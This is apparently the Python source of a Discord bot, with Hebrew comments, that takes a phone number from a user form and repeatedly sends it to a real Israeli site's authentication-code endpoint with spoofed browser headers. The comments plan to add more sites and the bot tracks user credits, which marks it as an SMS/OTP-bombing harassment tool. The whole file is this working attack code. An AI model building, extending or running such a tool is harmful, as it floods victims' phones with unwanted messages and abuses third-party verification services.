import discord
from discord.ext import commands
from discord import ui
import requests
import uuid
import os
import time
import random
import string
from flask import Flask
from threading import Thread
from datetime import datetime

# --- שרת Flask (Keep Alive) ---
app = Flask('')
@app.route('/')
def home(): return "Bot Online"

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

def keep_alive():
    t = Thread(target=run_flask)
    t.start()

# --- הגדרות בוט ---
TOKEN = os.environ.get('DISCORD_TOKEN')
ADMIN_ID = 1281295891579408418 

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

user_credits = {} 

# --- פונקציית התקיפה (כרגע ריקה מאתרים) ---
async def start_attack(interaction, target, rounds):
    success_count = 0
    failed_count = 0
    
    for r in range(rounds):
        f_uuid = str(uuid.uuid4())
        
        # כאן נוסיף את האתרים אחד אחרי השני
        apis = [
            # נתחיל עם חמ"ל כאתר הראשון לבדיקה
            {
                "n": "Hamal", 
                "u": "https://users-auth.hamal.co.il/auth/send-auth-code", 
                "d": {"value": target, "type": "phone", "projectId": "1"}, 
                "type": "json", 
                "ref": "https://www.hamal.co.il/"
            }
        ]

        for site in apis:
            try:
                h = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Referer": site["ref"],
                    "X-Requested-With": "XMLHttpRequest"
                }
                
                if site["type"] == "json":
                    res = requests.post(site["u"], json=site["d"], headers=h, timeout=5.0)
                else:
                    res = requests.post(site["u"], data=site["d"], headers=h, timeout=5.0)
                
                # הדפסה ללוג כדי שתראה מה קורה ב-Render
                print(f"Testing {site['n']}: Status {res.status_code}")
                
                if res.status_code in [200, 201]:
                    success_count += 1
                else:
                    failed_count += 1
                
                time.sleep(1.5) # דיליי בטוח לבדיקה
            except Exception as e:
                print(f"Error on {site['n']}: {e}")
                failed_count += 1
        
        time.sleep(1.0)

    await interaction.followup.send(f"✅ בדיקה הסתיימה.\nהצלחות: {success_count}\nנכשלו: {failed_count}", ephemeral=True)

# --- ממשק דיסקורד בסיסי ---
class AttackModal(ui.Modal, title='🚀 בדיקת אתרים'):
    phone = ui.TextInput(label='מספר טלפון לבדיקה', min_length=10, max_length=10)
    async def on_submit(self, interaction: discord.Interaction):
        user_credits[interaction.user.id] = user_credits.get(interaction.user.id, 0) + 10 # נותן קרדיטים לבדיקה
        await interaction.response.send_message(f"בודק את האתר הראשון על {self.phone.value}...", ephemeral=True)
        await start_attack(interaction, self.phone.value, 1)

class AttackView(ui.View):
    def __init__(self): super().__init__(timeout=None)
    @ui.button(label='🔍 בדוק אתר ראשון (חמ"ל)', style=discord.ButtonStyle.primary)
    async def test_btn(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_modal(AttackModal())

@bot.event
async def on_ready():
    print(f'✅ {bot.user.name} מוכן לבדיקה')
    bot.add_view(AttackView())

@bot.command()
async def setup(ctx):
    if ctx.author.id == ADMIN_ID:
        await ctx.send("לוח בקרה לבניית הבוט:", view=AttackView())

if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)
